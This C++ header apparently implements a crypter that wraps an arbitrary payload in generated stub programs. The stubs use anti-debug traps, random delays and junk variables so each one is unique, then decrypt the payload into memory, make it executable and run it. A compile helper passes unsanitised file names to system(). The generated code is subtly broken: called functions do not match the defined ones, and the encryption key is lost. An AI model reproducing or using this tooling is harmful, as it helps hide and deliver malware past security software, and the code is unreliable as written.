#ifndef UNIQUESTUB_H
#define UNIQUESTUB_H

#include <vector>
#include <string>
#include <cstdint>
#include <random>
#include <chrono>
#include <thread>
#include <algorithm>
#include <iostream>
#include <cstring>

#ifdef _WIN32
#include <windows.h>
#else
#include <sys/mman.h>
#include <unistd.h>
#endif

// Unique stub generator class
class UniqueStubGenerator {
private:
    std::random_device rd;
    std::mt19937 gen;
    
    // Anti-debug function template
    std::string generateAntiDebugFunction() {
        std::string functionName = generateRandomFunctionName();
        std::string code = "bool " + functionName + "() {\n";
        
#ifdef _WIN32
        code += "#ifdef _WIN32\n";
        code += "    if (IsDebuggerPresent()) {\n";
        code += "        // Infinite loop with anti-optimization\n";
        code += "        volatile int* p = (volatile int*)malloc(1024);\n";
        code += "        while (1) {\n";
        code += "            for (int i = 0; i < 256; i++) {\n";
        code += "                p[i] = p[i] ^ 0xDEADBEEF;\n";
        code += "                __asm { pause }\n";
        code += "            }\n";
        code += "        }\n";
        code += "    }\n";
        code += "#endif\n";
#endif
        
        code += "    return true;\n";
        code += "}\n\n";
        return code;
    }
    
    // Generate random function name
    std::string generateRandomFunctionName() {
        const std::string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        std::uniform_int_distribution<> dist(0, chars.length() - 1);
        
        std::string name;
        int length = std::uniform_int_distribution<>(8, 12)(gen);
        for (int i = 0; i < length; ++i) {
            name += chars[dist(gen)];
        }
        return name;
    }
    
    // Generate random XOR encryption function
    std::string generateXORFunction() {
        std::string functionName = generateRandomFunctionName();
        std::string keyName = generateRandomFunctionName();
        
        // Generate random key
        std::vector<uint8_t> key(16);
        std::uniform_int_distribution<> dist(0, 255);
        for (auto& byte : key) {
            byte = dist(gen);
        }
        
        std::string code = "std::vector<uint8_t> " + functionName + "(const std::vector<uint8_t>& data, const std::vector<uint8_t>& key) {\n";
        code += "    std::vector<uint8_t> result = data;\n";
        code += "    for (size_t i = 0; i < result.size(); i++) {\n";
        code += "        result[i] ^= key[i % key.size()];\n";
        code += "        result[i] = (result[i] >> 3) | (result[i] << 5);\n";
        code += "        result[i] ^= i & 0xFF;\n";
        code += "    }\n";
        code += "    return result;\n";
        code += "}\n\n";
        
        return code;
    }
    
    // Generate random delay function
    std::string generateDelayFunction() {
        std::string code = "{\n";
        code += "    std::random_device rd;\n";
        code += "    std::mt19937 gen(rd());\n";
        code += "    std::uniform_int_distribution<> dist(1, 925);\n";
        code += "    std::this_thread::sleep_for(std::chrono::milliseconds(dist(gen)));\n";
        code += "}\n\n";
        return code;
    }
    
    // Generate random volatile variables
    std::string generateVolatileVariables() {
        std::string code;
        int numVars = std::uniform_int_distribution<>(5, 15)(gen);
        
        for (int i = 0; i < numVars; ++i) {
            std::string varName = generateRandomFunctionName();
            int value = std::uniform_int_distribution<>(100, 999)(gen);
            code += "volatile int " + varName + " = " + std::to_string(value) + ";\n";
        }
        code += "\n";
        
        // Add some operations
        code += "{\n";
        code += "    auto " + generateRandomFunctionName() + " = []() { return 5; };\n";
        code += "    volatile int " + generateRandomFunctionName() + " = " + generateRandomFunctionName() + "();\n";
        code += "}\n";
        code += "{\n";
        code += "    volatile int " + generateRandomFunctionName() + " = 328;\n";
        code += "    " + generateRandomFunctionName() + " += 21;\n";
        code += "    " + generateRandomFunctionName() + " *= 10;\n";
        code += "}\n\n";
        
        return code;
    }
    
    // Generate encrypted payload
    std::vector<uint8_t> generateEncryptedPayload(const std::vector<uint8_t>& originalPayload) {
        std::vector<uint8_t> encrypted = originalPayload;
        std::uniform_int_distribution<> dist(0, 255);
        
        // Apply multiple layers of encryption
        for (size_t i = 0; i < encrypted.size(); ++i) {
            // XOR with random key
            encrypted[i] ^= dist(gen);
            // Bit rotation
            encrypted[i] = (encrypted[i] >> 3) | (encrypted[i] << 5);
            // Additional XOR with position
            encrypted[i] ^= i & 0xFF;
        }
        
        return encrypted;
    }
    
    // Convert bytes to hex string
    std::string bytesToHex(const std::vector<uint8_t>& data) {
        std::string hex;
        for (uint8_t byte : data) {
            char buf[4];
            snprintf(buf, sizeof(buf), "0x%02x", byte);
            hex += buf;
            hex += ", ";
        }
        if (!hex.empty()) {
            hex = hex.substr(0, hex.length() - 2); // Remove last ", "
        }
        return hex;
    }

public:
    UniqueStubGenerator() : gen(rd()) {}
    
    // Generate a unique stub with embedded payload
    std::string generateUniqueStub(const std::vector<uint8_t>& payload, const std::string& decryptionKey) {
        std::string stub = "/* Unique ID: " + std::to_string(std::chrono::duration_cast<std::chrono::milliseconds>(
            std::chrono::system_clock::now().time_since_epoch()).count()) + " */\n";
        
        // Add includes
        stub += "#include <iostream>\n";
        stub += "#include <vector>\n";
        stub += "#include <string>\n";
        stub += "#include <cstring>\n";
        stub += "#include <cstdint>\n";
        stub += "#include <algorithm>\n";
        stub += "#include <chrono>\n";
        stub += "#include <thread>\n";
        stub += "#include <random>\n";
        stub += "#ifdef _WIN32\n";
        stub += "#include <windows.h>\n";
        stub += "#else\n";
        stub += "#include <sys/mman.h>\n";
        stub += "#include <unistd.h>\n";
        stub += "#endif\n\n";
        
        // Add anti-debug function
        stub += generateAntiDebugFunction();
        
        // Add XOR function
        stub += generateXORFunction();
        
        // Add main function
        stub += "int main() {\n";
        
        // Add anti-debug call
        stub += "    " + generateRandomFunctionName() + "();\n\n";
        
        // Add delay
        stub += generateDelayFunction();
        
        // Add volatile variables
        stub += generateVolatileVariables();
        
        // Add encrypted payload
        std::vector<uint8_t> encryptedPayload = generateEncryptedPayload(payload);
        std::string payloadVarName = generateRandomFunctionName();
        stub += "std::vector<uint8_t> " + payloadVarName + " = {\n";
        stub += "    " + bytesToHex(encryptedPayload) + "\n";
        stub += "};\n\n";
        
        // Add decryption and execution
        stub += "    // Decrypt and execute payload\n";
        stub += "    std::vector<uint8_t> decrypted = " + generateRandomFunctionName() + "(" + payloadVarName + ", std::vector<uint8_t>{" + decryptionKey + "});\n";
        stub += "    \n";
        stub += "    // Execute the decrypted payload\n";
        stub += "    void* exec_mem = malloc(decrypted.size());\n";
        stub += "    memcpy(exec_mem, decrypted.data(), decrypted.size());\n";
        stub += "    \n";
        stub += "#ifdef _WIN32\n";
        stub += "    DWORD oldProtect;\n";
        stub += "    VirtualProtect(exec_mem, decrypted.size(), PAGE_EXECUTE_READWRITE, &oldProtect);\n";
        stub += "    ((void(*)())exec_mem)();\n";
        stub += "#else\n";
        stub += "    mprotect(exec_mem, decrypted.size(), PROT_READ | PROT_WRITE | PROT_EXEC);\n";
        stub += "    ((void(*)())exec_mem)();\n";
        stub += "#endif\n";
        stub += "    \n";
        stub += "    free(exec_mem);\n";
        stub += "    return 0;\n";
        stub += "}\n";
        
        return stub;
    }
    
    // Generate a simple unique stub (without payload)
    std::string generateSimpleStub() {
        std::string stub = "/* Simple Unique Stub ID: " + std::to_string(std::chrono::duration_cast<std::chrono::milliseconds>(
            std::chrono::system_clock::now().time_since_epoch()).count()) + " */\n";
        
        stub += "#include <iostream>\n";
        stub += "#include <vector>\n";
        stub += "#include <random>\n";
        stub += "#include <chrono>\n";
        stub += "#include <thread>\n\n";
        
        stub += "int main() {\n";
        stub += "    // Random delay\n";
        stub += "    std::this_thread::sleep_for(std::chrono::milliseconds(" + 
                std::to_string(std::uniform_int_distribution<>(100, 1000)(gen)) + "));\n";
        stub += "    \n";
        stub += "    // Random operations\n";
        stub += "    volatile int " + generateRandomFunctionName() + " = " + 
                std::to_string(std::uniform_int_distribution<>(100, 999)(gen)) + ";\n";
        stub += "    \n";
        stub += "    std::cout << \"Hello from unique stub!\" << std::endl;\n";
        stub += "    return 0;\n";
        stub += "}\n";
        
        return stub;
    }
    
    // Get a random stub from the pre-built collection
    std::string getRandomPrebuiltStub() {
        // This would normally read from the actual stub files
        // For now, return a template
        return generateSimpleStub();
    }
    
    // Generate unique key for encryption
    std::string generateUniqueKey() {
        std::vector<uint8_t> key(32);
        std::uniform_int_distribution<> dist(0, 255);
        
        for (auto& byte : key) {
            byte = dist(gen);
        }
        
        std::string keyStr;
        for (uint8_t byte : key) {
            char buf[4];
            snprintf(buf, sizeof(buf), "%d, ", byte);
            keyStr += buf;
        }
        if (!keyStr.empty()) {
            keyStr = keyStr.substr(0, keyStr.length() - 2); // Remove last ", "
        }
        
        return keyStr;
    }
};

// Utility functions for stub management
namespace UniqueStubUtils {
    
    // Save stub to file
    bool saveStubToFile(const std::string& stub, const std::string& filename) {
        FILE* file = fopen(filename.c_str(), "w");
        if (!file) return false;
        
        fwrite(stub.c_str(), 1, stub.length(), file);
        fclose(file);
        return true;
    }
    
    // Load stub from file
    std::string loadStubFromFile(const std::string& filename) {
        FILE* file = fopen(filename.c_str(), "r");
        if (!file) return "";
        
        fseek(file, 0, SEEK_END);
        long size = ftell(file);
        fseek(file, 0, SEEK_SET);
        
        std::string stub(size, '\0');
        fread(&stub[0], 1, size, file);
        fclose(file);
        
        return stub;
    }
    
    // Compile stub to executable
    bool compileStub(const std::string& stubFile, const std::string& outputFile) {
        std::string command = "g++ -std=c++17 -O2 -o " + outputFile + " " + stubFile;
        return system(command.c_str()) == 0;
    }
    
    // Generate unique filename
    std::string generateUniqueFilename(const std::string& prefix = "stub") {
        auto now = std::chrono::system_clock::now();
        auto timestamp = std::chrono::duration_cast<std::chrono::milliseconds>(
            now.time_since_epoch()).count();
        
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dist(1000, 9999);
        
        return prefix + "_" + std::to_string(timestamp) + "_" + std::to_string(dist(gen));
    }
}

#endif // UNIQUESTUB_H